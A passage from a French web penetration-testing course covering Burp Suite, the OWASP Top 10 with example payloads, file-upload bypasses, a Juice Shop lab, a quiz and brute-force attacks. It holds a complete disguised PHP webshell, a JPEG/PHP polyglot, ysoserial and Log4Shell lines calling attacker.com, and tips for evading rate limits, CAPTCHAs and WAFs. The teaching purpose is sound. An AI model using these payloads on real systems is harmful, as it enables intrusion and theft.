- **Options projet** : Paramètres spécifiques au projet en cours

##### Scope et ciblage

Définir un scope précis permet de se concentrer sur les cibles pertinentes :
```
# Exemple de définition de scope
^https?://example\.com/.*$
^https?://api\.example\.com/.*$
```

Configuration :
1. **Target** > **Scope**
2. Ajouter les URL/domaines cibles
3. Activer "Use advanced scope control"
4. Dans **Proxy** > **Options** > **Intercept Client Requests**, sélectionner "And URL is in target scope"

##### Certificats SSL

Pour intercepter le trafic HTTPS sans erreurs :
1. **Proxy** > **Options** > **Proxy Listeners** > **Edit**
2. Activer "Support invisible proxying"
3. Exporter le certificat CA de Burp (**Proxy** > **Options** > **Import / Export CA Certificate**)
4. Installer le certificat dans votre navigateur ou système

#### Module Proxy (avancé)

##### Filtres d'interception

Configurez des filtres précis pour n'intercepter que le trafic pertinent :
- **Proxy** > **Options** > **Intercept Client Requests**
- Exemples de règles utiles :
  - Intercepter uniquement les requêtes POST
  - Ignorer les requêtes d'images/CSS/JS
  - Intercepter uniquement les requêtes contenant certains paramètres

##### Match and Replace

Cette fonctionnalité permet de modifier automatiquement les requêtes/réponses :
- **Proxy** > **Options** > **Match and Replace**
- Exemples d'utilisation :
  - Remplacer un User-Agent
  - Ajouter des en-têtes d'authentification
  - Supprimer des protections CSRF

```
# Exemple de règle
Type: Request Header
Match: User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
```

#### Module Repeater (avancé)

##### Manipulation avancée

- **Groupes d'onglets** : Organiser les requêtes par fonctionnalité
- **Comparaison de réponses** : Clic droit > "Send to Comparer"
- **Modification des encodages** : Utiliser l'onglet "Hex" pour éditer les données binaires

##### Techniques utiles

- **Manipulation de cookies** : Modifier les cookies pour tester les contrôles d'accès
- **Test de paramètres** : Modifier systématiquement chaque paramètre
- **Fuzzing manuel** : Tester différentes valeurs pour identifier des comportements anormaux

#### Module Intruder (avancé)

##### Types d'attaques avancées

1. **Cluster bomb** : Toutes les combinaisons possibles de plusieurs ensembles de payloads
   - Idéal pour bruteforcer des identifiants (nom d'utilisateur + mot de passe)

2. **Pitchfork** : Utilise des listes correspondantes pour chaque position
   - Utile pour tester des paires de valeurs connues

##### Processeurs de payloads

Les processeurs permettent de transformer les payloads avant leur envoi :
- **Prefix/Suffix** : Ajouter du texte avant/après chaque payload
- **Match/Replace** : Remplacer des motifs dans les payloads
- **Encode** : Appliquer différents encodages (URL, Base64, etc.)
- **Hash** : Générer des hashes (MD5, SHA1, etc.)

Exemple d'utilisation :
```
# Payload original
password

# Après processeur Hash MD5
5f4dcc3b5aa765d61d8327deb882cf99
```

##### Extraction de données

Pour extraire des informations des réponses :
1. **Options** > **Grep - Extract**
2. Définir des expressions régulières pour capturer les données
3. Les résultats apparaîtront dans des colonnes supplémentaires

#### Autres modules essentiels

##### Scanner (Pro)

Le scanner actif recherche automatiquement les vulnérabilités :
- **Scanner** > **Scan configuration** > **New scan**
- Options importantes :
  - Crawl strategy (profondeur d'exploration)
  - Audit checks (types de vulnérabilités à rechercher)
  - Resource pool (limitation des ressources)

##### Decoder

Outil polyvalent pour encoder/décoder des données :
- Encodages supportés : URL, HTML, Base64, Hex, etc.
- Fonctionnalité "Smart decode" pour détecter automatiquement l'encodage
- Chaînage d'encodages/décodages

##### Comparer

Permet de comparer visuellement deux requêtes ou réponses :
- Mise en évidence des différences
- Utile pour identifier les changements subtils dans les réponses
- Options de visualisation : texte brut, mots, octets

##### Sequencer

Analyse la qualité aléatoire des tokens :
- Capture de tokens (sessions, CSRF, etc.)
- Analyse statistique de l'entropie
- Détection de modèles prévisibles

#### Extensions essentielles

##### Installation d'extensions

1. **Extender** > **BApp Store**
2. Parcourir ou rechercher des extensions
3. Cliquer sur "Install"

##### Extensions recommandées

1. **Autorize** : Détection automatique des problèmes de contrôle d'accès
2. **JWT Editor** : Manipulation avancée des tokens JWT
3. **Turbo Intruder** : Version améliorée d'Intruder pour les attaques à haute vitesse
4. **CSRF Scanner** : Détection des vulnérabilités CSRF
5. **Software Vulnerability Scanner** : Identification des composants vulnérables

##### Développement d'extensions personnalisées

Burp permet de créer des extensions en Python, Java ou Ruby :
1. **Extender** > **Extensions** > **Add**
2. Sélectionner le type d'extension et le fichier
3. Configurer les options spécifiques

Exemple simple d'extension Python :
```python
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Ma première extension")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(request)
            headers = analyzedRequest.getHeaders()
            headers.add("X-Custom-Header: MonHeader")
            body = request[analyzedRequest.getBodyOffset():]
            newRequest = self._helpers.buildHttpMessage(headers, body)
            messageInfo.setRequest(newRequest)
```

**En clair, pour un débutant :**
Burp Suite est comme un couteau suisse ultra-sophistiqué pour le pentesting web. Le Proxy intercepte les communications, Repeater permet de rejouer et modifier des requêtes, Intruder automatise les tests, et les extensions ajoutent des super-pouvoirs personnalisés. Maîtriser ces fonctionnalités avancées, c'est comme passer de simple conducteur à mécanicien expert : vous comprenez et contrôlez chaque aspect de l'interaction avec les applications web.

### OWASP Top 10 (2021) — résumé & mapping vers labs

L'OWASP Top 10 est la référence mondiale des vulnérabilités web les plus critiques. Voici un résumé de l'édition 2021 avec des liens vers des labs pratiques.

#### A01:2021 – Broken Access Control

Les contrôles d'accès défaillants permettent aux attaquants d'accéder à des données ou fonctionnalités non autorisées.

**Vulnérabilités principales :**
- Élévation de privilèges
- Contournement de restrictions d'accès
- IDOR (Insecure Direct Object References)
- CORS mal configuré
- Forçage de navigation

**Labs recommandés :**
- DVWA : "Insecure CAPTCHA"
- Juice Shop : "Admin Section", "Basket Manipulation"
- PortSwigger : "Unprotected admin functionality"

**Exemple d'exploitation :**
```
# Accès à une fonctionnalité admin via manipulation d'URL
https://example.com/admin (accès direct)
https://example.com/user/profile?role=admin (modification de paramètre)
```

#### A02:2021 – Cryptographic Failures

Les échecs cryptographiques concernent les problèmes liés à la protection des données sensibles.

**Vulnérabilités principales :**
- Transmission de données sensibles en clair
- Algorithmes cryptographiques faibles ou obsolètes
- Certificats invalides ou mal configurés
- Génération de valeurs aléatoires prévisibles

**Labs recommandés :**
- DVWA : "Weak Session IDs"
- Juice Shop : "Password Strength"
- PortSwigger : "Weak encryption"

**Exemple d'exploitation :**
```
# Interception de données sensibles en clair
# Utilisation d'un proxy pour capturer des identifiants transmis en HTTP
http://example.com/login?username=admin&password=secret
```

#### A03:2021 – Injection

Les vulnérabilités d'injection permettent d'insérer du code hostile qui est interprété par l'application.

**Vulnérabilités principales :**
- SQL Injection
- Command Injection
- LDAP Injection
- XPath Injection
- NoSQL Injection

**Labs recommandés :**
- DVWA : "SQL Injection", "Command Injection"
- Juice Shop : "Login Bender", "User Credentials"
- PortSwigger : "SQL injection vulnerability in WHERE clause"

**Exemple d'exploitation :**
```
# Injection SQL basique
' OR 1=1 --

# Injection de commande
; cat /etc/passwd
```

#### A04:2021 – Insecure Design

Cette nouvelle catégorie se concentre sur les failles de conception plutôt que d'implémentation.

**Vulnérabilités principales :**
- Absence d'analyse de menaces
- Conception ne tenant pas compte des cas d'abus
- Limites commerciales insuffisantes
- Manque de ségrégation des environnements

**Labs recommandés :**
- Juice Shop : "Password Reset"
- PortSwigger : "Excessive trust in client-side controls"
- OWASP WebGoat : "Insecure Login"

**Exemple d'exploitation :**
```
# Exploitation d'une réinitialisation de mot de passe mal conçue
# Modification de l'email dans la requête de réinitialisation
POST /reset-password
email=victim@example.com&new_email=attacker@evil.com
```

#### A05:2021 – Security Misconfiguration

Les erreurs de configuration sont souvent la cause de vulnérabilités facilement exploitables.

**Vulnérabilités principales :**
- Services inutiles activés
- Comptes par défaut actifs
- Pages d'erreur révélant trop d'informations
- Absence de durcissement de sécurité
- Configurations obsolètes ou vulnérables

**Labs recommandés :**
- DVWA : "File Inclusion"
- Juice Shop : "Error Handling"
- PortSwigger : "Information disclosure in error messages"

**Exemple d'exploitation :**
```
# Accès à des fichiers de sauvegarde exposés
https://example.com/backup.zip
https://example.com/app.config.bak
```

#### A06:2021 – Vulnerable and Outdated Components

L'utilisation de composants vulnérables ou obsolètes expose l'application aux risques connus.

**Vulnérabilités principales :**
- Bibliothèques non patchées
- Frameworks obsolètes
- Composants sans support
- Absence de scanning de vulnérabilités

**Labs recommandés :**
- Juice Shop : "Vulnerable Component"
- OWASP WebGoat : "Vulnerable Components"
- VulnHub : "Vulnerable Docker"

**Exemple d'exploitation :**
```
# Exploitation d'une vulnérabilité connue dans un composant
# Exemple : Log4Shell (CVE-2021-44228)
${jndi:ldap://attacker.com/exploit}
```

#### A07:2021 – Identification and Authentication Failures

Les défaillances d'authentification permettent de compromettre les identités des utilisateurs.

**Vulnérabilités principales :**
- Bruteforce possible
- Identifiants par défaut
- Stockage non sécurisé des mots de passe
- Récupération de mot de passe faible
- Gestion de session défaillante

**Labs recommandés :**
- DVWA : "Weak Session IDs", "Brute Force"
- Juice Shop : "Password Strength", "JWT Issues"
- PortSwigger : "Username enumeration"

**Exemple d'exploitation :**
```
# Attaque par force brute
# Script automatisé testant des combinaisons login/mot de passe
for password in wordlist:
    try_login("admin", password)
```

#### A08:2021 – Software and Data Integrity Failures

Cette nouvelle catégorie concerne les problèmes liés à l'intégrité du code et des données.

**Vulnérabilités principales :**
- Utilisation de dépendances non vérifiées
- Désérialisation non sécurisée
- CI/CD non sécurisé
- Mise à jour automatique sans vérification

**Labs recommandés :**
- Juice Shop : "Forged Feedback", "Forged Review"
- PortSwigger : "Insecure deserialization"
- OWASP WebGoat : "Insecure Deserialization"

**Exemple d'exploitation :**
```
# Exploitation d'une désérialisation Java
# Payload généré avec ysoserial
java -jar ysoserial.jar CommonsCollections5 'wget http://attacker.com/shell.sh -O /tmp/shell.sh' | base64
```

#### A09:2021 – Security Logging and Monitoring Failures

L'absence de journalisation et de surveillance adéquates empêche la détection des attaques.

**Vulnérabilités principales :**
- Absence de journalisation des événements critiques
- Logs non surveillés
- Alertes absentes ou inefficaces
- Absence de détection d'intrusion

**Labs recommandés :**
- Juice Shop : "Access Log"
- OWASP WebGoat : "Logging Security"
- Custom lab : "Log Poisoning"

**Exemple d'exploitation :**
```
# Injection dans les logs pour masquer une attaque
# Injection de caractères de nouvelle ligne pour fragmenter les entrées de log
username=admin%0d%0aAuthentication+successful
```

#### A10:2021 – Server-Side Request Forgery (SSRF)

Le SSRF permet à un attaquant de forcer le serveur à effectuer des requêtes non prévues.

**Vulnérabilités principales :**
- Accès à des services internes
- Contournement de pare-feu
- Exfiltration de données
- Scan de ports internes

**Labs recommandés :**
- PortSwigger : "Basic SSRF against the local server"
- Juice Shop : "SSTi"
- DVWA : "File Inclusion" (variante)

**Exemple d'exploitation :**
```
# SSRF basique pour accéder à un service interne
https://example.com/fetch?url=http://localhost:8080/admin

# SSRF pour accéder aux métadonnées cloud
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

#### Tableau de correspondance OWASP Top 10 et labs

| Vulnérabilité OWASP | DVWA | Juice Shop | PortSwigger | TryHackMe |
|---------------------|------|------------|-------------|-----------|
| A01: Broken Access Control | Insecure CAPTCHA | Admin Section | Unprotected admin | Ignite |
| A02: Cryptographic Failures | Weak Session IDs | Password Strength | Weak encryption | Agent Sudo |
| A03: Injection | SQL/Command Injection | Login Bender | SQL injection | Pickle Rick |
| A04: Insecure Design | N/A | Password Reset | Client-side controls | Overpass |
| A05: Security Misconfiguration | File Inclusion | Error Handling | Information disclosure | Thompson |
| A06: Vulnerable Components | N/A | Vulnerable Component | Exploiting XXE | Retro |
| A07: Auth Failures | Brute Force | JWT Issues | Username enumeration | Basic Pentesting |
| A08: Integrity Failures | N/A | Forged Review | Insecure deserialization | Anthem |
| A09: Logging Failures | N/A | Access Log | N/A | Overpass 2 |
| A10: SSRF | File Inclusion (var.) | SSTi | Basic SSRF | Dogcat |

**En clair, pour un débutant :**
L'OWASP Top 10 est comme le "hit-parade" des failles de sécurité web. Il liste les 10 types de vulnérabilités les plus dangereuses et fréquentes. Chaque catégorie représente une famille de problèmes qui peuvent compromettre votre application. Ce tableau vous montre où pratiquer chaque type de vulnérabilité dans différents environnements d'entraînement, comme un guide des meilleures salles de sport pour chaque muscle que vous voulez développer.

### Upload Vulnerabilities → shell.php bypass MIME

Les vulnérabilités d'upload de fichiers sont parmi les plus dangereuses car elles peuvent mener directement à l'exécution de code arbitraire sur le serveur.

#### Fonctionnement et risques

Lorsqu'une application permet aux utilisateurs d'uploader des fichiers sans contrôles adéquats, un attaquant peut :
- Uploader des webshells pour exécuter des commandes
- Contourner les restrictions d'authentification
- Uploader des malwares pour infecter d'autres utilisateurs
- Déclencher des vulnérabilités dans les parseurs de fichiers

#### Types de restrictions et contournements

##### 1. Restrictions basées sur l'extension

**Restriction** : L'application vérifie uniquement l'extension du fichier.
```javascript
// Exemple de vérification côté client
if (!filename.match(/\.(jpg|jpeg|png|gif)$/i)) {
  alert("Extension non autorisée");
}
```

**Contournements** :
- Double extension : `shell.php.jpg`
- Extension alternative : `shell.phtml`, `shell.php5`, `shell.inc`
- Caractères spéciaux : `shell.php;.jpg`, `shell.php%00.jpg` (nullbyte, PHP < 5.3.4)
- Casse mixte : `shell.PhP`

##### 2. Restrictions basées sur le type MIME

**Restriction** : L'application vérifie le Content-Type dans l'en-tête de la requête.
```php
// Exemple de vérification côté serveur
$allowed_types = array('image/jpeg', 'image/png', 'image/gif');
if (!in_array($_FILES['upload']['type'], $allowed_types)) {
  die("Type MIME non autorisé");
}
```

**Contournements** :
- Modification de l'en-tête Content-Type dans la requête
- Utilisation d'un proxy comme Burp Suite pour changer `application/x-php` en `image/jpeg`

##### 3. Vérification du contenu du fichier (magic bytes)

**Restriction** : L'application vérifie les premiers octets du fichier pour déterminer son type réel.
```php
// Exemple de vérification des magic bytes
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$file_type = finfo_file($finfo, $_FILES['upload']['tmp_name']);
if (!in_array($file_type, $allowed_types)) {
  die("Type de fichier non autorisé");
}
```

**Contournements** :
- Ajout des magic bytes d'une image au début du fichier PHP
- Exemple pour JPEG : `FF D8 FF E0` + code PHP
```
GIF89a;
<?php system($_GET['cmd']); ?>
```

##### 4. Validation de l'intégrité de l'image

**Restriction** : L'application tente de traiter l'image pour vérifier qu'elle est valide.
```php
// Exemple de vérification par traitement
$image = imagecreatefromjpeg($_FILES['upload']['tmp_name']);
if (!$image) {
  die("Image invalide");
}
imagedestroy($image);
```

**Contournements** :
- Création d'une image valide contenant du code PHP dans les métadonnées
- Exploitation de vulnérabilités dans les bibliothèques de traitement d'images

#### Création d'une webshell polyvalente

Voici un exemple de webshell PHP simple mais efficace :

```php
<?php
// Webshell basique
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
// Webshell avec interface
if(isset($_REQUEST['ui'])){
    echo '<form action="" method="post">';
    echo '<input type="text" name="cmd" style="width:500px">';
    echo '<input type="submit" value="Execute">';
    echo '</form>';
    if(isset($_REQUEST['cmd'])){
        echo '<pre>';
        system($_REQUEST['cmd']);
        echo '</pre>';
    }
    exit;
}
// Uploader de fichiers
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
    exit;
}
// Camoufler la webshell comme une erreur 404
header("HTTP/1.0 404 Not Found");
echo "<h1>404 Not Found</h1>";
?>
```

#### Techniques avancées de bypass MIME

##### Polyglot files (fichiers polyglots)

Un fichier polyglot est valide dans plusieurs formats simultanément.

**Exemple de fichier JPEG/PHP polyglot** :
```
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01
00 01 00 00 FF FE 00 3B 3C 3F 70 68 70 20 73 79
73 74 65 6D 28 24 5F 47 45 54 5B 27 63 6D 64 27
5D 29 3B 20 3F 3E
```

Ce fichier est à la fois une image JPEG valide et contient du code PHP exécutable.

##### Utilisation de wrappers PHP

Si l'application inclut les fichiers uploadés, vous pouvez utiliser des wrappers PHP :

```
# Utilisation du wrapper data
<?php
include($_GET['file']);
?>

# Exploitation
file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

##### Race conditions

Exploiter le délai entre la vérification et le déplacement du fichier :

1. Uploader un fichier légitime (image.jpg)
2. Pendant que le serveur le traite, remplacer rapidement son contenu par du code malveillant
3. Le serveur vérifie le fichier légitime mais déplace la version malveillante

#### Méthodologie d'attaque

1. **Reconnaissance** :
   - Identifier les fonctionnalités d'upload
   - Déterminer les types de fichiers autorisés
   - Observer les messages d'erreur

2. **Analyse des restrictions** :
   - Tester différentes extensions
   - Examiner les vérifications côté client (JavaScript)
   - Analyser les requêtes avec Burp Suite

3. **Bypass progressif** :
   - Commencer par des techniques simples
   - Combiner plusieurs méthodes si nécessaire
   - Adapter les payloads au contexte

4. **Exploitation** :
   - Uploader la webshell
   - Localiser le fichier uploadé
   - Exécuter des commandes

5. **Post-exploitation** :
   - Établir une connexion plus stable
   - Élever les privilèges
   - Maintenir l'accès

#### Outils spécialisés

- **Weevely** : Générateur de webshell PHP furtive
  ```bash
  weevely generate password /path/to/shell.php
  weevely http://target.com/uploads/shell.php password
  ```

- **FUXPLOIDER** : Framework pour tester les vulnérabilités d'upload
  ```bash
  python3 fuxploider.py --url http://target.com/upload.php --not-regex "wrong file type"
  ```

**En clair, pour un débutant :**
Les vulnérabilités d'upload de fichiers, c'est comme si un gardien de musée vérifiait seulement la couverture des livres que vous apportez, sans jamais regarder à l'intérieur. Vous pouvez cacher un outil de cambriolage dans un livre dont la couverture semble inoffensive. Le bypass MIME, c'est comme déguiser votre fichier malveillant en photo de vacances en lui mettant un masque (en-tête d'image) pour tromper le système de sécurité. Une fois votre "cheval de Troie" à l'intérieur, vous pouvez exécuter des commandes sur le serveur comme si vous y étiez physiquement connecté.

### Mini-lab « OWASP Juice Shop medium flags »

Ce mini-lab vous guide à travers l'exploitation de plusieurs vulnérabilités de niveau intermédiaire dans l'application OWASP Juice Shop.

#### Préparation

1. **Lancement de Juice Shop** :
   ```bash
   docker run -d -p 3000:3000 bkimminich/juice-shop
   ```

2. **Accès à l'application** :
   - Ouvrez votre navigateur et accédez à `http://localhost:3000`
   - Créez un compte utilisateur pour commencer

#### Flag 1 : Exploitation d'une faille XSS stockée

**Objectif** : Injecter du code JavaScript dans un avis produit qui s'exécutera lorsque d'autres utilisateurs visualiseront le produit.

**Étapes** :
1. Connectez-vous à votre compte
2. Accédez à n'importe quel produit
3. Cliquez sur "Ajouter un avis"
4. Dans le champ de commentaire, injectez le payload suivant :
   ```html
   <iframe src="javascript:alert(`xss`)">
   ```
5. Soumettez l'avis et vérifiez que l'alerte s'affiche lorsque vous revisitez la page du produit

**Explication** :
Le site n'effectue pas de validation adéquate des entrées utilisateur dans les avis. La balise `<iframe>` avec une source JavaScript est une technique courante pour contourner les filtres XSS basiques.

#### Flag 2 : Manipulation de panier (IDOR)

**Objectif** : Accéder et manipuler le panier d'un autre utilisateur.

**Étapes** :
1. Ajoutez un produit à votre panier
2. Interceptez la requête avec Burp Suite
3. Notez l'ID de votre panier dans la requête :
   ```
   GET /rest/basket/1 HTTP/1.1
   ```
4. Modifiez l'ID pour tenter d'accéder à d'autres paniers :
   ```
   GET /rest/basket/2 HTTP/1.1
   ```
5. Parcourez différents IDs jusqu'à trouver un panier appartenant à un autre utilisateur

**Explication** :
Cette vulnérabilité est un exemple classique d'IDOR (Insecure Direct Object Reference) où l'application ne vérifie pas correctement si l'utilisateur a le droit d'accéder à la ressource demandée.

#### Flag 3 : Exploitation d'une faille d'injection SQL

**Objectif** : Contourner l'authentification en utilisant une injection SQL.

**Étapes** :
1. Accédez à la page de connexion
2. Interceptez la requête de connexion avec Burp Suite
3. Modifiez le paramètre email pour inclure une injection SQL :
   ```
   email=admin@juice-sh.op' OR 1=1--&password=anypassword
   ```
4. Observez que vous êtes connecté en tant qu'administrateur

**Explication** :
L'application construit une requête SQL vulnérable comme :
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' OR 1=1--' AND password = 'hash_of_password'
```
La condition `OR 1=1` rend toujours la clause WHERE vraie, et `--` commente le reste de la requête, ignorant la vérification du mot de passe.

#### Flag 4 : Bypass d'upload de fichier

**Objectif** : Uploader un fichier malveillant en contournant les restrictions.

**Étapes** :
1. Accédez à la section "Complaint" (Réclamation)
2. Préparez un fichier "malveillant" simple (par exemple, un script shell renommé en .jpg)
3. Tentez d'uploader le fichier et observez le rejet
4. Interceptez la requête avec Burp Suite
5. Modifiez le Content-Type de `application/x-sh` à `image/jpeg`
6. Envoyez la requête modifiée et vérifiez que le fichier est accepté

**Explication** :
L'application vérifie le type MIME du fichier mais ne valide pas son contenu réel, permettant d'uploader des fichiers potentiellement dangereux en modifiant simplement l'en-tête Content-Type.

#### Flag 5 : Exploitation d'une vulnérabilité JWT

**Objectif** : Modifier un token JWT pour élever vos privilèges.

**Étapes** :
1. Connectez-vous avec votre compte normal
2. Utilisez les DevTools du navigateur pour examiner les cookies
3. Copiez la valeur du cookie `token` (un JWT)
4. Décodez le JWT sur jwt.io
5. Modifiez la partie payload pour changer `"role":"customer"` en `"role":"admin"`
6. Signez à nouveau le token avec l'algorithme "none" (supprimez la signature)
7. Mettez à jour le cookie dans votre navigateur avec le token modifié
8. Accédez à `/administration` pour vérifier vos privilèges d'administrateur

**Explication** :
Cette vulnérabilité exploite deux faiblesses : l'application accepte des tokens signés avec l'algorithme "none" (absence de signature) et ne vérifie pas correctement les rôles lors de l'accès aux fonctionnalités d'administration.

#### Rapport et réflexion

Pour chaque vulnérabilité exploitée, documentez :
1. La vulnérabilité identifiée
2. La méthode d'exploitation
3. L'impact potentiel dans un environnement réel
4. Les mesures de correction recommandées

**Exemple de rapport pour le Flag 3 (Injection SQL) :**
```
Vulnérabilité : Injection SQL dans le formulaire de connexion
Méthode d'exploitation : Utilisation de la syntaxe ' OR 1=1-- pour contourner l'authentification
Impact : Accès non autorisé à des comptes privilégiés, compromission potentielle de toutes les données utilisateur
Correction : Utiliser des requêtes paramétrées ou des ORM, implémenter une validation stricte des entrées
```

**En clair, pour un débutant :**
Ce mini-lab est comme un parcours d'obstacles où chaque flag représente une faille de sécurité différente à exploiter. Vous apprenez à injecter du code JavaScript malveillant, à accéder aux données d'autres utilisateurs en modifiant des identifiants, à tromper la base de données avec des injections SQL, à déguiser des fichiers dangereux, et à falsifier votre badge d'identité numérique (JWT) pour obtenir des privilèges d'administrateur. Ces exercices pratiques vous montrent concrètement comment les attaquants exploitent les vulnérabilités web dans un environnement sécurisé.

### Quiz

1. **Quelle fonctionnalité de Burp Suite permet de modifier automatiquement certaines parties des requêtes HTTP ?**
   - A) Repeater
   - B) Intruder
   - C) Match and Replace
   - D) Decoder
   
   *Réponse : C) Match and Replace*

2. **Quelle vulnérabilité de l'OWASP Top 10 2021 est nouvelle et se concentre sur les problèmes de conception plutôt que d'implémentation ?**
   - A) Broken Access Control
   - B) Insecure Design
   - C) Security Misconfiguration
   - D) Software and Data Integrity Failures
   
   *Réponse : B) Insecure Design*

3. **Quelle technique permet de contourner une vérification de type MIME lors d'un upload de fichier ?**
   - A) Changer l'extension du fichier
   - B) Modifier l'en-tête Content-Type dans la requête
   - C) Utiliser une double extension
   - D) Toutes les réponses ci-dessus
   
   *Réponse : D) Toutes les réponses ci-dessus*

4. **Quelle attaque dans Juice Shop consiste à modifier un token pour obtenir des privilèges d'administrateur ?**
   - A) XSS
   - B) IDOR
   - C) JWT Manipulation
   - D) SQL Injection
   
   *Réponse : C) JWT Manipulation*

5. **Quel type d'attaque Intruder est le plus approprié pour tester toutes les combinaisons possibles de plusieurs ensembles de payloads ?**
   - A) Sniper
   - B) Battering Ram
   - C) Pitchfork
   - D) Cluster Bomb
   
   *Réponse : D) Cluster Bomb*
## PARTIE D — Niveau Avancé 2 : Authentication Attacks

### Enumeration & Brute Force

L'énumération et les attaques par force brute sont des techniques fondamentales pour compromettre les mécanismes d'authentification.

#### Énumération d'utilisateurs

L'énumération d'utilisateurs consiste à découvrir des noms d'utilisateurs valides sur un système cible.

##### Vecteurs d'énumération courants

1. **Messages d'erreur révélateurs** :
   - "Nom d'utilisateur incorrect" vs "Mot de passe incorrect"
   - Ces différences permettent de déterminer si un utilisateur existe

2. **Temps de réponse** :
   - Les requêtes pour des utilisateurs existants peuvent prendre plus de temps (vérification du mot de passe)
   - Ou moins de temps (rejet rapide d'utilisateurs inexistants)

3. **Fonctionnalités de récupération de mot de passe** :
   - "Un email a été envoyé à ***@example.com" (utilisateur existe)
   - "Aucun compte associé à cette adresse" (utilisateur n'existe pas)

4. **Codes de statut HTTP** :
   - Différences subtiles (200 vs 302 vs 403)
   - En-têtes de réponse différents

##### Techniques d'énumération avec Hydra

Hydra est un outil puissant pour l'énumération et le brute force :

```bash
# Énumération d'utilisateurs via HTTP POST
hydra -L userlist.txt -p test123 target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Identifiant incorrect"

# Énumération via temps de réponse (avec Burp Intruder)
# Configurer une attaque Sniper avec une liste d'utilisateurs
# Analyser la colonne "Response completed" pour identifier les anomalies de temps
```

#### Attaques par force brute

Les attaques par force brute tentent systématiquement toutes les combinaisons possibles pour trouver des identifiants valides.

##### Types d'attaques

1. **Force brute pure** :
   - Essai de toutes les combinaisons possibles
   - Exemple : aaaa, aaab, aaac, ... zzzz

2. **Attaque par dictionnaire** :
   - Utilisation de listes de mots courants
   - Plus efficace que la force brute pure

3. **Attaque hybride** :
   - Combinaison de dictionnaires et de règles de mutation
   - Exemple : password → Password1, p@ssword, etc.

4. **Credential stuffing** :
   - Utilisation de paires identifiant/mot de passe divulguées
   - Exploite la réutilisation de mots de passe

##### Outils spécialisés

###### Hydra

```bash
# Brute force SSH
hydra -l admin -P wordlist.txt ssh://10.10.10.10

# Brute force formulaire web
hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Échec de l'authentification"

# Brute force avec plusieurs threads
hydra -l admin -P wordlist.txt -t 64 target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Échec"

# Brute force avec délai entre les tentatives
hydra -l admin -P wordlist.txt -t 1 -W 3 target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Échec"
```

###### wfuzz

wfuzz est particulièrement utile pour le fuzzing de paramètres web :

```bash
# Brute force de formulaire de connexion
wfuzz -c -z file,users.txt -z file,passwords.txt --hs "Échec" http://target.com/login?user=FUZZ&pass=FUZ2Z

# Brute force avec filtrage par taille de réponse
wfuzz -c -z file,passwords.txt --hc 403 -fs 1234 http://target.com/login?user=admin&pass=FUZZ

# Brute force avec en-têtes personnalisés
wfuzz -c -z file,passwords.txt -H "Cookie: session=1234" http://target.com/login?user=admin&pass=FUZZ
```

##### Contournement des protections

1. **Limitation de débit (rate limiting)** :
   - Réduire le nombre de threads
   - Ajouter des délais entre les requêtes
   - Utiliser des proxys rotatifs

2. **Verrouillage de compte** :
   - Cibler plusieurs comptes simultanément
   - Limiter les tentatives par compte
   - Utiliser des listes de mots optimisées

3. **CAPTCHA** :
   - Services de résolution automatique (anti-captcha)
   - Exploitation de failles d'implémentation (CAPTCHA présent dans la réponse mais non vérifié)

4. **WAF (Web Application Firewall)** :
   - Modification des en-têtes (User-Agent, Referer)
   - Rotation d'adresses IP
   - Modification du format des requêtes

##### Création de wordlists personnalisées

Les wordlists personnalisées augmentent significativement les chances de succès :

```bash
# Génération de wordlist avec règles de mutation
hashcat --stdout wordlist.txt -r rules/best64.rule > mutated_wordlist.txt

# Création de wordlist ciblée avec CeWL (extraction de mots depuis un site web)
cewl http://target.com -m 6 -d 2 -w target_words.txt

# Combinaison de wordlists
cat wordlist1.txt wordlist2.txt | sort | uniq > combined_wordlist.txt
```

**En clair, pour un débutant :**
L'énumération d'utilisateurs, c'est comme essayer de deviner quelles sonnettes fonctionnent dans un immeuble avant même d'essayer d'ouvrir les portes. Les attaques par force brute, c'est ensuite tester méthodiquement toutes les clés possibles sur les sonnettes qui fonctionnent. Hydra et wfuzz sont comme des robots qui appuient sur ces sonnettes automatiquement, à grande vitesse, en essayant différentes combinaisons jusqu'à trouver celle qui ouvre la porte. Les protections comme les CAPTCHA ou le verrouillage de compte sont comme des gardiens qui vous empêchent d'essayer trop de clés trop rapidement.

### Session Management

La gestion de session est un aspect critique de la sécurité des applications web, permettant de maintenir l'état d'authentification des utilisateurs.

#### Fonctionnement des sessions

Une session web typique fonctionne comme suit :
1. L'utilisateur s'authentifie avec ses identifiants
2. Le serveur génère un identifiant de session unique
3. Cet identifiant est stocké côté client (généralement dans un cookie)
4. Le serveur associe cet identifiant à l'utilisateur dans sa base de données
5. Les requêtes ultérieures incluent cet identifiant pour maintenir l'authentification

#### Vulnérabilités des cookies de session

##### Flags de sécurité des cookies

Les flags de sécurité des cookies sont essentiels pour protéger les sessions :

1. **HttpOnly** :
   - Empêche l'accès au cookie via JavaScript
   - Protège contre les attaques XSS
   ```
   Set-Cookie: session=abc123; HttpOnly
   ```

2. **Secure** :
   - Limite l'envoi du cookie aux connexions HTTPS
   - Protège contre l'interception en transit
   ```
   Set-Cookie: session=abc123; Secure
   ```

3. **SameSite** :
   - Contrôle l'envoi du cookie lors de requêtes cross-origin
   - Valeurs : Strict, Lax, None
   - Protège contre les attaques CSRF
   ```
   Set-Cookie: session=abc123; SameSite=Strict
   ```

4. **Domain** :
   - Spécifie le domaine auquel le cookie s'applique
